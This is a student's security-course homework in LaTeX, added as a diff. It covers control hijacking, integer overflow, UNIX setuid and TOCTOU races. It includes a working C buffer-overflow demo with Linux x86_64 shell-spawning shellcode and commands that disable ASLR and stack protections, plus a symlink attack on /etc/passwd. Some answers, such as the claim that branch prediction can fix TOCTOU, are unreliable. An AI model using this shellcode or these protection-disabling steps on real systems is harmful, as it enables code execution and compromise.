@@ -1,0 +1,231 @@
+\documentclass[11pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{hyperref}
+\usepackage{enumerate}
+\usepackage{algpseudocode}
+\usepackage{fullpage}
+\usepackage{mdwlist}
+\usepackage{hyperref}
+\usepackage[superscript,biblabel]{cite}
+
+\begin{document}
+
+\title{ Bilgisayar Sistemleri ve Ağ Güvenliği - Homework 1 }
+\date{November 25, 2014}
+\author{Mahmut Bulut - 14501026\\ Computer Engineering Dept., Yıldız Technical University}
+
+\maketitle
+\subsection*{Problem 1: Control Hijacking}
+
+\begin{enumerate}[\indent a)]
+\item Because attacker should know where is return address\footnote{\url{https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html}} and it is going to be hard to find with testing(in stack)\footnote{\url{http://articles.manugarg.com/stack.html}}, moreover he should write to heap address. If he is going to alter the Global Offset Table\footnote{\url{http://www.open-security.org/texts/6}} he does not needed to write both on stored address on heap and return address(with return-to-got attack)\footnote{\url{http://www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf}}. If attacker wants to place a shellcode\footnote{\url{http://users.ece.cmu.edu/~adrian/630-f04/readings/AlephOne97.txt}} in buffer, buffer shouldn't smash above the return address (e.g. function params). If we overwrite return address and we don't know lower bytes of it, OS will throw bus error. Besides that OS has some built-in protection like ASLR(Address Space Layout Randomization). It makes address computations harder(thus I couldn't place a shellcode within context). I tried to get rid of ASLR but on MacOS machine it is hard to get rid of it. On the way to experimenting with this homework I discovered Xcode is building executables with PIE(Position Independent Executable)\footnote{\url{http://www.nasm.us/doc/nasmdoc7.html\#section-7.6.1}} enabled. This means ASLR is always enabled whatever you pass as compiler argument from Xcode IDE GUI. But on command line you can compile with PIE disabled. At the end I used Linux x86\_64 machine to overcome this problem. Currently many attack types don't allow directly writing to return address. Prevention for stack manipulation done by canaries, NX bit\footnote{\url{http://www.win.tue.nl/~aeb/linux/hh/protection.html}} and layout randomization and more. Every protection has its own attack vector.
+
+\item 
+\begin{verbatim}
+//
+//  main.c
+//  skyjack
+//
+//  Created by Mahmut Bulut on 23/11/14.
+//  Copyright (c) 2014 Mahmut Bulut. All rights reserved.
+//
+// Disable ASLR:
+//  	echo 0 > /proc/sys/kernel/randomize_va_space
+//
+// and compile this via:
+// 		gcc -g -fpic -fno-stack-protector -DFORTIFY_SOURCE=0 -z execstack skyjack.c -o skyjack
+// to use shell exploit.
+//
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char* data;
+
+void watchaddr() {
+    printf("%p\n", __builtin_return_address(2));
+}
+
+void doodah(char *argv[])
+{
+    /**
+     * Simulate the behavior of StackGuard (preamble)
+     * 1- Get return address
+     * 2- Allocate space on heap
+     * 3- Put return address to a randomized address
+     * (for this demonstration we put it in 0xD - can be randomized)
+     */
+    printf("%p\n", __builtin_return_address(0));
+    data = (unsigned long long*) malloc(sizeof(unsigned long long)*0xDEADBEEF);
+    *(unsigned long long *)(&data+0xD) = __builtin_return_address(0);
+
+    
+    /**
+     * Shellcode to execute after buffer overflow
+     * This shellcode writes itself every execution to memory
+     * In some ASLR protection data is written via cache invalidation
+     * ref. https://github.com/sharedRoutine/ASLR-Write/blob/master/aslrwrite.h#L81
+     */
+    char shellcode[] =
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+
+    /**
+     * Above NOP sled is 100 bytes
+     */
+    
+    "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62" \
+    "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31" \
+    "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c" \
+    "\x58\x0f\x05" \
+
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+
+    /**
+     * Above shell launcher part is 60 bytes and it is only for Linux x86_64
+     */
+    
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
+    
+    /**
+     * Above NOP sled is 40 bytes
+     */
+    
+    /**
+     * Buffer is full now smash the RBP
+     */
+    
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    
+    char* dat = (char *) __builtin_return_address(0);
+    printf("Overwriting return address %x\n", dat); // to end of shellcode
+    // copy expected return address (low bytes) and evade from ASLR crashes temporarily
+    memcpy((void *)shellcode+216, &dat, 4);
+
+    /**
+     * print the ending of shellcode to see it was compensated by the address
+     */
+    printf("212 pchar %x\n", shellcode[212]);
+    printf("213 pchar %x\n", shellcode[213]);
+    printf("214 pchar %x\n", shellcode[214]);
+    printf("215 pchar %x\n", shellcode[215]);
+    printf("216 pchar %x\n", shellcode[216]);
+    printf("217 pchar %x\n", shellcode[217]);
+    printf("218 pchar %x\n", shellcode[218]);
+    printf("219 pchar %x\n", shellcode[219]);
+
+    printf("Expected function return addr %p\n", __builtin_return_address(0));
+    printf("Shellcode address on DS %p\n", &shellcode);
+
+    /**
+     * Buffer, which is going to be overflow
+     */
+    char buffer[200];
+    strcpy(buffer, shellcode);
+    printf("BUFFER %p\n", &buffer);
+
+    if (argv[1] != 0x0 && strcmp(argv[1], "Y") == 0)
+    {
+        (*(void (*)()) buffer)();
+    }
+
+    /**
+     * Below code behaves like stack guard (postamble)
+     * Checks return address with address saved in heap
+     */
+    printf("%p\n", __builtin_return_address(0));
+    printf("GELEN ADRES %p\n", *(&data+0xD));
+    printf("ALINAN ADRES %p\n", __builtin_return_address(0));
+
+    if (*(&data+0xD) == __builtin_return_address(0)) {
+        _exit(0); // if everything is ok _exit, without atexit(without stack cleanup and alignment)
+    } else{
+        abort(); // or abort immediately with unsuccessful termination.
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    if (argc != 2)
+    {
+        perror("usage:\n\t- pass Y to use shell exploit\n\t- pass N to look return address backup");
+        exit(EXIT_FAILURE);
+    }
+
+    /**
+     * Goin' to run all night
+     * Goin' to run all day
+     * I bet my money on a bob-tailed nag
+     * Somebody bet on the gray
+     * 
+     * http://youtu.be/noYptXPHiAE
+     */
+    
+    printf("DOO-DAH\n");
+    doodah(argv);
+
+    return 0;
+}
+\end{verbatim}
+Above code writes a shellcode to buffer and overwrites low bytes of return address to get passed from stackguard like protection environment. Overwrite works on ASLR enabled environments(MacOS x86\_64, Linux x86\_64 tested). Shellcode belongs to Linux x86\_64 with \footnote{\url{http://shell-storm.org/shellcode/files/shellcode-77.php}}. I wrote return address storing and checking code after that I developed my own exploit. At the beginning of the code compiler arguments are written. But not all them are needed like \textit{-z exectack} or \textit{-g}.
+\end{enumerate}
+
+\subsection*{Problem 2: Memory Management}
+\begin{enumerate}[\indent a)]
+\item \textit{size\_t memsize = sizeof (*hdr) + size;}
+is a size calculation which means it includes integer arithmetic because of that if \textit{size} is bigger than the barrier value for that calculation \textit{memsize} overflows and it will be smaller than \textit{size}\footnote{\url{http://antid0te.com/CSW2012_StefanEsser_iOS5_An_Exploitation_Nightmare_FINAL.pdf}} these lines added for preventing these kind of integer overflow attacks. Without the lines added in iOS 5.x a function with large \textit{size} value can make a integer overflow, moreover if code allocates bytes with overflowed size it will be only a small portion of the memory. Rest of the area can be writable and data can be injected through the unallocated memory region. Also data can be overwritten in this way(spread in memory) or with this exploit data can read other freed areas with historical values(from their old processes). This can be the exploit of this vulnerability.
+\item It makes difficult to find return address, register values and exloitable objects in binary because binary addresses are randomized and cannot be predictable on where it will take place on OS. Variable declarations are distant from each other and don't know where a variable will take place in memory. Saves kernel memory allocation to chunks. This provides also decreased amount of chroot breaks to iOS devices in this manner. Full control will be inhibited with this way. But on the other hand this allocation is introduced OBOE(Off-by-one Error) NUL byte overflow exploits.
+\end{enumerate}
+
+\subsection*{Problem 3: UNIX Access Control}
+\begin{enumerate}[\indent a)]
+\item When a process is created by FORK, the created process inherits its parent's UIDs. We can understand that child process's  UIDs(RUID, EUID, SUID) copied from parents'.\footnote{\url{http://skednet.wordpress.com/2010/07/07/uid-euid-suid-fsuid/}}
+
+\item
+\begin{enumerate}[a)]
+\item In this premise; process doesn't have priviledges because EUID differs from 0. EUID is used for checking shell scripts working in elevated priviledges\footnote{\url{http://bashshell.net/shell-scripts/forcing-scripts-to-run-as-root/}}, so if it isn't 0 there is no elevated priviledges. Setuid has OS specific differences, this makes setting uids under different OSes complicated\cite{chen2002setuid}. We can assume given uuid is \textit{m} that condition sets EUID to \textit{m} because SUID and RUID is also \textit{m} on contrast to that if EUID is not \textit{m} EUID will stay same with value \textit{n}.\footnote{\url{http://pubs.opengroup.org/onlinepubs/009695399/functions/setuid.html}}
+\begin{algorithmic}
+\If {$euid := 0$}
+    \State $ruid := newuid, euid := newuid, suid := newuid$
+\Else
+    \State $euid := newuid$ (Only \textbf{given uid} is equal to the \textbf{RUID} or the \textbf{SUID})
+\EndIf
+\end{algorithmic}
+\item Like above pseudocode if \textit{n} equal to 0 it means it has elevated priviledges and it can set all RUID, SUID set even itself.
+\end{enumerate}
+
+\item Separate uids make isolation between processes, they cannot interfere with each others' memory space. Normally same uid processes don't have problems with lock downs on same region but separate uids makes this difference in process context. Like in presentations of this lecture it also add compartmentalization to processes.
+
+\item Because 0 belongs to elevated priviledges and couldn't be considered as unauthorized process level uid. If processes have 0 as uid value every process can set its uid types. It will become meaningless to have 0 as uid value if no setuid is running after of spawn. Therefore as much as possible in distributed systems, systems should become compartmentalized and different values of uid in every compartment other than zero.
+
+\item Everytime fork creates copied uids from parent to child so Zygote process runs as root and has 0 as uid on all types. So forking from it creates 0 uid processes whereupon they \textit{setuid} for themselves. Processes becomes discrete and compartmentalized processes after that. Main idea for that named as PoLP(Principle of Least priviledge).\footnote{\url{http://en.wikipedia.org/wiki/Principle_of_least_privilege}} This makes separation between system level and user level applications. Application level access to resources becomes more independent than system. User level crashes or lock downs doesnt interfere with system resource allocation(at least in Android it works like that because of VM layout.)
+
+\item Alice can craft a file that can be run by Bob or attachable runnable to a process on Bob's space. This makes exploit different users space. Also arbitrary \textit{chown} command execution can fill time-shared systems and other users disk space with indelible files. Moreover these files that will be placed in other users' environment can spy on them and get info about their environment, sensitive data etc. if attacker gains elevated priviledges.
+\end{enumerate}
+
+\subsection*{Problem 4: TOCTOU}
+\begin{enumerate}[\indent a)]
+\item If symbolic link created for \textit{file.dat} to \textit{/etc/passwd}, \textit{/dev/* devices} or any other system file or block in sleep(10) time slice write to that block or file and system will be exploited.
+
+\item Sleep doesn't make exploit keep up working like that without sleep execution can interfere with another exploit block. Nowadays end user computing doesn't involve with massively parallel processes. Scheduling should be done right and pipelined execution in current CPUs make exploitable environments like that. Already of the name of the problem TOCTOU embodies race condition exploitation.
+
+\item I think there is no fix for that kind of things in current os and architecture types.\footnote{\url{http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use\#Preventing_TOCTTOU}} Branch prediction hardware can be hardened in this way to avoid some of that TOCTOU exploitation. So programs can know where the execution is going to be and loads branch addresses faster than normal.
+
+\end{enumerate}
+
+\bibliography{hw1}{}
+\bibliographystyle{plain}
+\end{document}
